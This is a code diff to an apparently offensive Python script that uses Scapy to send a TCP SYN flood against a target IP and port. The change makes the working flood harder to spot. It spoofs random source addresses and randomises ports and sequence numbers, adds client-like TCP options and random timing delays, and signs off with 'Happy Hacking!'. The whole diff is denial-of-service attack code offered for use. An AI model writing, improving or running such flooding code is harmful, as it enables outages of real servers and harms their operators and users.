@@ -71,19 +71,63 @@ def server_status(target_ip):
         return False
 
 def syn_flood(target_ip, target_port, duration):
-    """Perform a TCP SYN Flood Attack."""
-    print(f"{YELLOW}[+] Starting TCP SYN Flood Attack on {target_ip}:{target_port}{RESET}")
+    """Perform a TCP SYN Flood Attack with MTU 1500."""
+    print(f"{YELLOW}[+] Starting TCP SYN Flood Attack on {target_ip}:{target_port} (MTU 1500){RESET}")
     timeout = time.time() + duration
     packet_count = 0
+    
+    # MTU 1500: MSS = 1500 - 20 (IP) - 20 (TCP base) = 1460
+    mss_option = 1460  # Fixed MSS for MTU 1500
+    
     try:
         while time.time() < timeout:
             # Generate a random source IP
             src_ip = ".".join(map(str, (random.randint(1, 255) for _ in range(4))))
-            packet = IP(src=src_ip, dst=target_ip) / TCP(sport=random.randint(1024, 65535),
-                                                          dport=target_port, flags="S")
+            # Random source port in ephemeral range (HTTP-like)
+            src_port = random.randint(49152, 65535)
+            # Random sequence number
+            seq_num = random.randint(1, 4294967295)
+            # Fixed window size (max for HTTP clients)
+            window_size = 65535
+            # Timestamp for realism
+            timestamp_option = int(time.time())
+
+            # Craft TCP options (HTTP-like, respecting MTU)
+            tcp_options = [
+                ('MSS', mss_option),           # 4 bytes
+                ('Timestamp', (timestamp_option, 0)),  # 10 bytes
+                ('NOP', None),                 # 1 byte
+                ('SAckOK', ''),                # 2 bytes
+            ]
+            # Total TCP header: 20 (base) + 17 (options) = 37 bytes
+            # Total packet: 20 (IP) + 37 (TCP) = 57 bytes < 1500
+
+            # Craft the packet
+            packet = (
+                IP(src=src_ip, dst=target_ip) /
+                TCP(
+                    sport=src_port,
+                    dport=target_port,
+                    flags="S",  # SYN flag
+                    seq=seq_num,
+                    window=window_size,
+                    options=tcp_options
+                )
+            )
+            
+            # Verify packet size respects MTU 1500
+            packet_size = len(packet)
+            if packet_size > 1500:
+                print(f"{RED}[WARNING] Packet size {packet_size} exceeds MTU 1500!{RESET}")
+                break
+
+            # Send the packet
             send(packet, verbose=False)
             packet_count += 1
             print(f"{CYAN}[PACKETS SENT: {packet_count}]{RESET}", end="\r")
+            # Small delay to mimic HTTP client behavior
+            time.sleep(random.uniform(0.005, 0.05))
+
     except KeyboardInterrupt:
         print(f"\n{RED}[INFO] Stopping TCP SYN Flood Attack...{RESET}")
         print(f"{GREEN}Happy Hacking!{RESET}")
